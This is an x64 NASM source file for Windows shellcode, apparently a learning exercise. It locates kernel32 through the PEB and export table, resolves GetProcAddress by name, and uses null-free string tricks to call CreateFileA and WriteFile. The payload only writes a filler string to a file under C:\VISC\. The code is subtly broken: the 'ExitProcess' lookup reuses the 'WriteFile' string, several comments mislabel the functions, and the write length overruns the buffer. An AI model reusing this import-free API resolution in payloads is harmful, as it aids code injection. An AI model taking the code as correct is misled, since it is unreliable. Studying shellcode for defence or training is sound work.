BITS 64
SECTION .text
global main

main:
    xor rbx, rbx
    mov rax, [gs:rbx+0x60]                      ; TEB address 
    mov rax, [rax + 0x18]                ; PEB address 
    mov rsi, [rax + 0x20]                ; PEB_LDR_DATA  
    lodsq                                       ; ntdll.dll 
    xchg rax, rsi
    lodsq                                       ; kernelbase.dll 
    mov rbx, [rax + 0x20]                ; kernel32.dll 

    xor r8, r8 
    mov r8d, [rbx + 0x3c]               ; pe signature rva 
    mov rdx, r8 
    add rdx, rbx                        ; pe header 
    xor rcx, rcx 
    mov cl, 0x88 
    mov r8d, [rdx + rcx]               ; rva export table 
    add r8, rbx 
    mov rdx, r8                         ; export table 

    xor rsi, rsi 
    mov esi, [rdx + 0x20]               ; name table rva 
    add rsi, rbx                        ; name table 
    xor rcx, rcx 
    mov r9, 0x41636f7250746547          ; GetProcA
  get_getprocAddr : 
    inc rcx 
    mov eax, [rsi + rcx * 4]            ; name table contains offset of string name functions 
    add rax, rbx 
    cmp QWORD [rax], r9     
    jnz get_getprocAddr 

    xor rsi, rsi
    mov esi, [rdx + 0x24] 
    add rsi, rbx                        ; rva ordinal table 
    mov cx, [rsi + 2 * rcx]             ; position  
    xor rsi, rsi 
    mov esi, [rdx + 0x1c]               ; rva address table 
    add rsi, rbx                        ; address table 
    xor rdi, rdi 
    mov r14d, [rsi + rcx * 4]            ; rva address of winexec 
    add r14, rbx                        ; address of GetProcAddress 

    ; get CreateFileA address by calling GetProcAddress
    ; GetProcAddress(lib_base, function_name) 
    xor rdx, rdx 
    mov edx, 0x41656caa 
    shr edx, 8  
    push rdx 
    mov rdx, 0x6946657461657243         ; LoadLibraryA 
    push rdx 
    mov rdx, rsp   
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rsi, rax                        ; address of CreateFileA functions 

    ; CreateFile(filename,                // name of the write
	;	GENERIC_WRITE,          // open for writing
	;	0,                      // do not share
	;	NULL,                   // default security
	;	CREATE_NEW,             // create new file only
	;	FILE_ATTRIBUTE_NORMAL,  // normal file
	;	NULL);
    xor rcx, rcx 
    push rcx 
    mov rcx, 0x3237663731653832 
    push rcx
    mov rcx, 0x6437663336393664
    push rcx 
    mov rcx, 0x3062663432646333
    push rcx 
    mov rcx, 0x3839303531303039
    push rcx 
    mov rcx, 0x5c435349565c3a43 
    push rcx 
    mov rcx, rsp 
    xor rdx, rdx 
    mov dl, 0x4 
    shl rdx, 28
    xor r8, r8
    sub rsp, 0x50 
    xor r9, r9 
    mov r9b, 0x80 
    mov [rsp + 0x28], r9b 
    xor r9, r9 
    inc r9  
    mov [rsp + 0x20], r9
    xor r9 , r9
    mov [rsp + 0x30], r9 
    call rsi 
    add rsp, 0x50 
    mov r15, rax                        ; hFile 

    ; GetProcAddress(kernel32.dll, 'WriteFile') 
    xor rdx, rdx 
    mov dl, 0x65 
    push rdx 
    mov rdx, 0x6c69466574697257         ; WriteFile 
    push rdx 
    mov rdx, rsp   
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov r13, rax  

    ;   WriteFile(
	;	hFile,           // open file handle
	;	DataBuffer,      // start of data to write
	;	dwBytesToWrite,  // number of bytes to write
	;	&dwBytesWritten, // number of bytes that were written
	;	NULL)
    mov rcx, r15 
    jmp getData 
returnData : 
    pop rdx 
    xor r8, r8 
    sub rsp, 0x50
    mov r9, rsp 
    add r9, 0x30  
    mov [rsp + 0x20], r8 
    mov r8w, 0x220  
    call r13 
    add rsp, 0x30 

    ; GetProcAddress(kernel32.dll, 'CloseHandle') 
    xor rdx, rdx 
    mov edx, 0x656c64aa
    shr edx, 8  
    push rdx 
    mov rdx, 0x6e614865736f6c43         ; CloseHandle 
    push rdx 
    mov rdx, rsp   
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov r13, rax   

    ; CloseHandle(hFile) 
    mov rcx, r15 
    call r13 

    ; GetProcAddress(kernel32.dll, 'ExitProcess') 
    xor rdx, rdx 
    mov dl, 0x65 
    push rdx 
    mov rdx, 0x6c69466574697257
    push rdx 
    mov rdx, rsp 
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rdi, rax

    
    
    ; ExitProcess(0) 
    xor rcx, rcx 
    call rdi 

; ------------------------------------------------------------------------------------
getData : 
    call returnData 
    db "Shellcode window is so hard @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    db 0x00 